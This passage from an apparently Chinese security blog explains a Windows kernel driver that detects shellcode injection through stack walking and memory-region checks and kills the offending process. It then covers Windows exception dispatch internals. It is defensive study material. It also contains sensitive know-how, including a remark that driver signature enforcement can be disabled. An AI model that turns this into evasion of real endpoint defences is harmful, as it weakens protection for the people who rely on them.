*PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>在代码中初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MEMORY_BASIC_INFORMATION MBInformation[<span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION)] = &#123; <span class="number">0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ZwQueryVirtualMemory通过 NTSTATUS接收返回参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">NT_SUCCESS (状态)</span><br><span class="line">如果 Status 指定的返回值是成功类型 (0 • 0x3FFFFFFF) 或信息类型 (0x40000000 • 0x7FFFFFFF) ，则计算结果为 TRUE。</span><br><span class="line"></span><br><span class="line">NT_INFORMATION (状态)</span><br><span class="line">如果 Status 指定的返回值是信息类型 (0x40000000 • 0x7FFFFFFF) ，则计算结果为 TRUE。</span><br><span class="line"></span><br><span class="line">NT_WARNING (状态)</span><br><span class="line">如果 Status 指定的返回值是警告类型 (0x80000000 • 0xBFFFFFFF) ，则计算结果为 TRUE。</span><br><span class="line"></span><br><span class="line">NT_ERROR (状态)</span><br><span class="line">如果 Status 指定的返回值是错误类型 (0xC0000000 -0xFFFFFFFF) ，则计算结果为 TRUE。</span><br></pre></td></tr></table></figure>

<p>这里写一个判断，来看我们是否查询成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS nt_status = ZwQueryVirtualMemory(NtCurrentProcess(), (PVOID)pAddress,</span><br><span class="line">MemoryBasicInformation, MBInformation, <span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION),</span><br><span class="line">(PSIZE_T)&amp;RetLength);</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(nt_status))</span><br></pre></td></tr></table></figure>

<p>然后我们再看**_MEMORY_BASIC_INFORMATION**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _MEMORY_BASIC_INFORMATION &#123;</span><br><span class="line">  PVOID  BaseAddress;</span><br><span class="line">  PVOID  AllocationBase;</span><br><span class="line">  DWORD  AllocationProtect;</span><br><span class="line"> #if defined(_WIN64)</span><br><span class="line">  WORD   PartitionId;</span><br><span class="line"> #endif</span><br><span class="line">  SIZE_T RegionSize;</span><br><span class="line">  DWORD  State;</span><br><span class="line">  DWORD  Protect;</span><br><span class="line">  DWORD  Type;</span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>在上面的结构里面，会有参数state来确定页面是否处于MEM_COMMIT状态，Type参数有三个值来判断是否为可读可写可执行内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">类型	含义</span><br><span class="line">MEM_IMAGE</span><br><span class="line">0x1000000</span><br><span class="line">指示区域中的内存页映射到图像节的视图中。</span><br><span class="line">MEM_MAPPED</span><br><span class="line">0x40000</span><br><span class="line">指示区域中的内存页映射到节的视图中。</span><br><span class="line">MEM_PRIVATE</span><br><span class="line">0x20000</span><br><span class="line">指示区域中的内存页是专用 (，而不是由其他进程) 共享。</span><br></pre></td></tr></table></figure>

<p>首先先判断是否为 Mapped 或 private ，将写拷贝内存过滤掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> IsMemory = MBInformation-&gt;Type == MEM_PRIVATE || MBInformation-&gt;Type ==</span><br><span class="line">MEM_MAPPED;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再判断是否为 MEM_COMMIT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> IsCommit = MBInformation-&gt;State == MEM_COMMIT;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MEM_COMMIT 是在 Windows 操作系统中用于内存管理的重要标志之一。它的作用如下：</span><br><span class="line"></span><br><span class="line">作用</span><br><span class="line">分配物理内存: 当使用 MEM_COMMIT 标志时，系统会为某个内存区域分配实际的物理内存。这意味着该内存区域可以立即被程序使用。</span><br><span class="line"></span><br><span class="line">确保内存有效性: 通过使用 MEM_COMMIT，操作系统保证在访问该内存区域时不会出现“访问冲突”等错误，因为内存是已经被实际分配和映射的。</span><br><span class="line"></span><br><span class="line">支持写时复制: 当结合其他标志如 MEM_RESERVE 和 MEM_RESET 一起使用时，可以创建更复杂的内存策略。例如，你可以首先保留地址空间（MEM_RESERVE），然后在使用前通过 MEM_COMMIT 将其实际分配给物理内存。</span><br></pre></td></tr></table></figure>

<p>最后判断具体是哪种权限的内存，至少要有执行权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> IsExecute = MBInformation-&gt;Protect == PAGE_EXECUTE || MBInformation-</span><br><span class="line">&gt;Protect == PAGE_EXECUTE_READWRITE ||</span><br><span class="line">MBInformation-&gt;Protect == PAGE_EXECUTE_READ || MBInformation-&gt;Protect ==</span><br><span class="line">PAGE_EXECUTE_WRITECOPY;</span><br></pre></td></tr></table></figure>

<p>整体相与，满足所有条件的内存进行判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> IsResult = <span class="literal">false</span>;</span><br><span class="line">IsResult = IsMemory &amp;&amp; IsCommit &amp;&amp; IsExecute;</span><br></pre></td></tr></table></figure>

<p>先初始化一下我们对于栈的查询</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PVOID ary[MAX_PATH]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">ULONG StackCount;</span><br><span class="line">StackCount = RtlWalkFrameChain(ary,MAX_PATH,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后通过循环遍历</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ULONG i = StackCount; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (CheckVAD((PVOID)ary[i]))</span><br><span class="line">&#123;</span><br><span class="line">DebugPrint(<span class="string">&quot;Stack : %d Address : %p \n&quot;</span>, i, ary[i]);</span><br><span class="line">bResult = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用栈回溯来检测内存的栈是否被修改，如果修改则证明有shellcode的注入（粗暴</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(stack_trace() == false)</span><br></pre></td></tr></table></figure>

<p>最后使用ZwTerminateProcess结束当前进程的所有线程并输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint(<span class="string">&quot;[!] Find shellcode inject , Process Name:</span></span><br><span class="line"><span class="string">%s\n&quot;</span>,PsGetProcessImageFileName(PsGetCurrentProcess()));</span><br><span class="line">ZwTerminateProcess(NtCurrentProcess(), <span class="number">0</span>);</span><br><span class="line">DebugPrint(<span class="string">&quot;[√] Delete successfully\n&quot;</span>);</span><br></pre></td></tr></table></figure>





<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_WALK_WEIGHT 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DebugPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,</span></span><br><span class="line">__VA_ARGS__)</span><br><span class="line">NTKERNELAPI UCHAR* <span class="title function_">PsGetProcessImageFileName</span><span class="params">(__in PEPROCESS Process)</span>;</span><br><span class="line">NTKERNELAPI NTSTATUS NTAPI <span class="title function_">ZwQueryInformationProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">_In_ HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">_In_ PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="line"><span class="params">_Out_ PVOID ProcessInformation,</span></span><br><span class="line"><span class="params">_In_ ULONG ProcessInformationLength,</span></span><br><span class="line"><span class="params">_Out_opt_ PULONG ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_TYPE</span> &#123;</span></span><br><span class="line">PsProtectedTypeNone = <span class="number">0</span>,</span><br><span class="line">PsProtectedTypeProtectedLight = <span class="number">1</span>,</span><br><span class="line">PsProtectedTypeProtected = <span class="number">2</span></span><br><span class="line">&#125; PS_PROTECTED_TYPE, * PPS_PROTECTED_TYPE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_SIGNER</span> &#123;</span></span><br><span class="line">PsProtectedSignerNone = <span class="number">0</span>,</span><br><span class="line">PsProtectedSignerAuthenticode,</span><br><span class="line">PsProtectedSignerCodeGen,</span><br><span class="line">PsProtectedSignerAntimalware,</span><br><span class="line">PsProtectedSignerLsa,</span><br><span class="line">PsProtectedSignerWindows,</span><br><span class="line">PsProtectedSignerWinTcb,</span><br><span class="line">PsProtectedSignerWinSystem,</span><br><span class="line">PsProtectedSignerApp,</span><br><span class="line">PsProtectedSignerMax</span><br><span class="line">&#125; PS_PROTECTED_SIGNER, * PPS_PROTECTED_SIGNER;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_PROTECTION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">UCHAR Level;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">UCHAR Type : <span class="number">3</span>;</span><br><span class="line">UCHAR Audit : <span class="number">1</span>; <span class="comment">// Reserved</span></span><br><span class="line">UCHAR Signer : <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; PS_PROTECTION, * PPS_PROTECTION;</span><br><span class="line">BOOLEAN hLoadImageNotify;</span><br><span class="line">BOOLEAN <span class="title function_">CheckStackVAD</span><span class="params">(PVOID pAddress)</span></span><br><span class="line">&#123;</span><br><span class="line">BOOLEAN bResult = FALSE;</span><br><span class="line"><span class="type">size_t</span> iReturnlength;</span><br><span class="line">MEMORY_BASIC_INFORMATION MemoryInfomation[<span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION)]</span><br><span class="line">= &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (MemoryInfomation)</span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS nt_status = ZwQueryVirtualMemory(NtCurrentProcess(),</span><br><span class="line">(PVOID)pAddress, MemoryBasicInformation, MemoryInfomation,</span><br><span class="line"><span class="keyword">sizeof</span>(MEMORY_BASIC_INFORMATION), (PSIZE_T)&amp;iReturnlength);</span><br><span class="line"><span class="keyword">if</span> (NT_SUCCESS(nt_status))</span><br><span class="line">&#123;</span><br><span class="line">BOOLEAN is_map_memory = (MemoryInfomation-&gt;Type == MEM_PRIVATE ||</span><br><span class="line">MemoryInfomation-&gt;Type == MEM_MAPPED) &amp;&amp; MemoryInfomation-&gt;State == MEM_COMMIT;</span><br><span class="line">bResult = is_map_memory &amp;&amp;</span><br><span class="line">(MemoryInfomation-&gt;Protect == PAGE_EXECUTE || MemoryInfomation-</span><br><span class="line">&gt;Protect == PAGE_EXECUTE_READWRITE ||</span><br><span class="line">MemoryInfomation-&gt;Protect == PAGE_EXECUTE_READ ||</span><br><span class="line">MemoryInfomation-&gt;Protect == PAGE_EXECUTE_WRITECOPY);</span><br><span class="line"><span class="keyword">if</span> (bResult)</span><br><span class="line">&#123;</span><br><span class="line">DebugPrint(<span class="string">&quot;MemoryInfomation_Protect: %08X</span></span><br><span class="line"><span class="string">MemoryInfomation_Type: %08X \n&quot;</span>, MemoryInfomation-&gt;Protect, MemoryInfomation-</span><br><span class="line">&gt;Type);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bResult;</span><br><span class="line">&#125;</span><br><span class="line">BOOLEAN <span class="title function_">WalkStack</span><span class="params">(<span class="type">int</span> pHeight)</span></span><br><span class="line">&#123;</span><br><span class="line">BOOLEAN bResult = TRUE;</span><br><span class="line">PVOID dwStackWalkAddress[STACK_WALK_WEIGHT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG64 iWalkChainCount = RtlWalkFrameChain(dwStackWalkAddress,</span><br><span class="line">STACK_WALK_WEIGHT, <span class="number">1</span>); <span class="comment">// 1为用户层</span></span><br><span class="line"><span class="type">int</span> iWalkLimit = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (ULONG64 i = iWalkChainCount; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (iWalkLimit &gt; pHeight)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">iWalkLimit++;</span><br><span class="line"><span class="keyword">if</span> (CheckStackVAD((PVOID)dwStackWalkAddress[i]))</span><br><span class="line">&#123;</span><br><span class="line">DebugPrint(<span class="string">&quot;Stack: %d Address: %p \n&quot;</span>, i, dwStackWalkAddress[i]);</span><br><span class="line">bResult = FALSE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bResult;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">LoadImageNotify</span><span class="params">(PUNICODE_STRING pFullImageName, HANDLE pProcessId,</span></span><br><span class="line"><span class="params">PIMAGE_INFO pImageInfo)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (KeGetCurrentIrql() != PASSIVE_LEVEL)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (PsGetCurrentProcessId() != (HANDLE)<span class="number">4</span> &amp;&amp; PsGetCurrentProcessId() !=</span><br><span class="line">(HANDLE)<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (WalkStack(<span class="number">10</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line">DebugPrint(<span class="string">&quot;[!] Find shellcode inject,process</span></span><br><span class="line"><span class="string">name:%s\n&quot;</span>,PsGetProcessImageFileName(PsGetCurrentProcess()));</span><br><span class="line">ZwTerminateProcess(NtCurrentProcess(), <span class="number">0</span>);</span><br><span class="line">DebugPrint(<span class="string">&quot;[√] Delete successfully\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (hLoadImageNotify)</span><br><span class="line">PsRemoveLoadImageNotifyRoutine(LoadImageNotify);</span><br><span class="line">DebugPrint(<span class="string">&quot;Driver unload successfully \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)</span></span><br><span class="line">&#123;</span><br><span class="line">hLoadImageNotify = NT_SUCCESS(PsSetLoadImageNotifyRoutine(LoadImageNotify));</span><br><span class="line"><span class="keyword">if</span> (!hLoadImageNotify)</span><br><span class="line">&#123;</span><br><span class="line">DebugPrint(<span class="string">&quot;LoadImageNotify failed\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">DebugPrint(<span class="string">&quot;Driver load successfully\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="最后记录一下"><a href="#最后记录一下" class="headerlink" title="最后记录一下"></a>最后记录一下</h2><p>上面没有提到，在win10里面加载驱动是需要Kernel-Mode driver manager的，如果提示Open handle error那么检查有没有用管理员权限</p>
<p>其次，<strong>win10以上不接受没有数字签名的驱动，这个可以关掉</strong></p>
<p>最后就是，在测试几个注入和shellcodeloder的过程中</p>
<p>Session注入在dll进程所附加的活动确实没有启动，但是在线程中的活动照常启动了（疑惑</p>
<p>受制于我现在的知识，我附了windbg之后确实没发现什么问题，Session注入之后dll照常挂在了进程里面，但是代表进程附加的那个弹窗没有出现，只有线程的</p>
<p>特此在这里记录一下，以后看看能不能找到原因</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBoxW(0, L&quot;1&quot;, L&quot;1&quot;, MB_OK);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        MessageBoxW(0, L&quot;2&quot;, L&quot;2&quot;, MB_OK);</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B/" data-id="cm1zwlrfr000fu0v6bypi5unu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Windows异常" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Windows%E5%BC%82%E5%B8%B8/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.563Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Windows异常"><a href="#Windows异常" class="headerlink" title="Windows异常"></a>Windows异常</h1><h2 id="异常执行流程"><a href="#异常执行流程" class="headerlink" title="异常执行流程"></a>异常执行流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CPU检测到异常 -&gt; 查中断表执行处理函数 -&gt; CommonDispatchException -&gt; KiDispatchException -</span><br><span class="line">&gt; KiUserExceptionDispatcher -&gt; RtlDispatchException -&gt; VEH -&gt; SEH</span><br></pre></td></tr></table></figure>

<p>只有找不到异常函数，才会抛出异常给用户</p>
<p>异常产生后，首先是要记录异常信息(异常的类型、异常发生的位置等)，然后要寻找异常的处理函数，我 们称为异常的分发，最后找到异常处理函数并调用，我们称为异常处理</p>
<p>有两种异常：CPU异常 软件模拟的异常</p>
<h3 id="CPU产生异常"><a href="#CPU产生异常" class="headerlink" title="CPU产生异常"></a>CPU产生异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.CPU指令检测到异常(例：除0)</span><br><span class="line">2.查IDT表，执行中断处理函数</span><br><span class="line">3.CommonDispatchException</span><br><span class="line">4.KiDispatchException</span><br></pre></td></tr></table></figure>

<p>先可以找到IDT表的零号中断，我们可以在ntoskrnl.exe文件中找到这个结构</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930211515159.png" alt="image-20240930211515159"></p>
<p>一路向下跟，我们找到了上面所提到的CommonDispatchException函数</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930220423360.png" alt="image-20240930220423360"></p>
<p>可以看见CommonDispatchException主要是把一些异常的信息存储到了自己的结构体_EXCEPTION_RECORD里面<img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930220539858.png" alt="image-20240930220539858"></p>
<p>这个结构体在微软中的定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">  DWORD                    ExceptionCode;<span class="comment">//异常代码</span></span><br><span class="line">  DWORD                    ExceptionFlags;<span class="comment">//异常状态</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span><span class="comment">//下一个异常地址</span></span><br><span class="line">  PVOID                    ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">  DWORD                    NumberParameters;<span class="comment">//附加参数个数</span></span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];<span class="comment">//附加参数指针</span></span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>

<p>最后通过KiDispatchException 去找到异常处理函数</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930220758471.png" alt="image-20240930220758471"></p>
<p>回到之前调用CommonDispatchException的时候，代码往寄存器里面存入了一个0C0000094h</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930225055008.png" alt="image-20240930225055008"></p>
<p>根据查询表可知，这是一个除零的异常，在三环中一般也就是这个异常，其他的例如溢出都在零环内</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930225620306.png" alt="image-20240930225620306"></p>
<p>另一个ebx里面被赋予了一个[ebp+0x68]的值，这里涉及三环进零环，是有换栈的操作的，ebp指向的是一个Trap_Frame，这里面有很多换栈的操作</p>
<p>（这里我是以xp为例的，64为的Trap_Frame结构不一样）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTrap_Frame</span><br><span class="line">nt!_KTRAP_FRAME</span><br><span class="line">   +0x000 DbgEbp           : Uint4B</span><br><span class="line">   +0x004 DbgEip           : Uint4B</span><br><span class="line">   +0x008 DbgArgMark       : Uint4B</span><br><span class="line">   +0x00c DbgArgPointer    : Uint4B</span><br><span class="line">...........................................</span><br><span class="line">   +0x064 ErrCode          : Uint4B</span><br><span class="line">   +0x068 Eip              : Uint4B</span><br><span class="line">   +0x06c SegCs            : Uint4B</span><br><span class="line">   ...............................</span><br></pre></td></tr></table></figure>

<p>我们可以看见，在上面的代码中，0x68指向的是eip，也就是我们错误发生的地址，这样这两参数分别对应了ExceptionCode 和 ExceptionAddress</p>
